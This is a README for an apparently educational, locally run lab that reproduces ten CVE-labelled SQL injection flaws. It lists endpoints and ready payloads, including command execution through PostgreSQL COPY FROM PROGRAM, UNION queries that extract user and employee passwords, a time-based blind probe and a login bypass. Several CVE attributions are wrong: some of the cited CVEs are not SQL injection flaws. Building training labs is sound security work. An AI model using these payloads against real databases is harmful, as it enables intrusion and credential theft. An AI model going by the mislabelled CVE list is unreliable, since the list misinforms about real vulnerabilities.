# Advanced SQL Injection Lab

This lab implements 10 critical SQL injection CVEs for educational purposes.

## Setup

1. Build and start containers:
```bash
docker-compose up --build -d
```

2. Access the lab at:
http://localhost:8080

## Implemented CVEs

### 1. CVE-2019-9193 - PostgreSQL RCE
- **Endpoint**: `/cve-2019-9193?query=test`
- **Payload**: 
```sql
test'; CREATE TABLE exfil(data text); COPY exfil FROM PROGRAM 'id'--
```

### 2. CVE-2020-7471 - Django StringAgg
- **Endpoint**: `/cve-2020-7471?delim=,`
- **Payload**: 
```sql
') FROM "vuln_table" WHERE 1=1 OR ("vuln_table"."id")::text LIKE '100'--
```

### 3. CVE-2018-15133 - Laravel unserialize
- **Endpoint**: `/cve-2018-15133` (POST)
- **Payload**: Serialized PHP object injection

### 4. CVE-2020-35476 - Drupal JSON:API
- **Endpoint**: `/cve-2020-35476?filter=1=1`
- **Payload**: 
```sql
1=1) UNION SELECT username,password FROM users--
```

### 5. CVE-2020-14750 - WebLogic
- **Endpoint**: `/cve-2020-14750?id=1`
- **Payload**: 
```sql
1 UNION SELECT SYS.DATABASE_NAME FROM DUAL--
```

### 6. CVE-2020-5405 - Spring Data JPA
- **Endpoint**: `/cve-2020-5405?name=admin`
- **Payload**: 
```sql
admin' AND 1=1) OR (1=1 AND '1'='1
```

### 7. CVE-2020-1956 - Apache Kylin
- **Endpoint**: `/cve-2020-1956?project=test`
- **Payload**: 
```sql
test' UNION SELECT password FROM users--
```

### 8. CVE-2020-5515 - SuiteCRM
- **Endpoint**: `/cve-2020-5515?id=1`
- **Payload**: 
```sql
1' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)-- 
```

### 9. CVE-2019-19879 - Dolibarr
- **Endpoint**: `/cve-2019-19879` (POST)
- **Payload**: 
```sql
admin'-- 
```

### 10. CVE-2021-27852 - PrestaShop
- **Endpoint**: `/cve-2021-27852?id=1`
- **Payload**: 
```sql
1 UNION SELECT 1,CONCAT(login,':',passwd),3,4 FROM ps_employee--
```

## Security Warning
- This lab contains dangerous vulnerabilities
- Use only in isolated environments
- Never expose to public networks
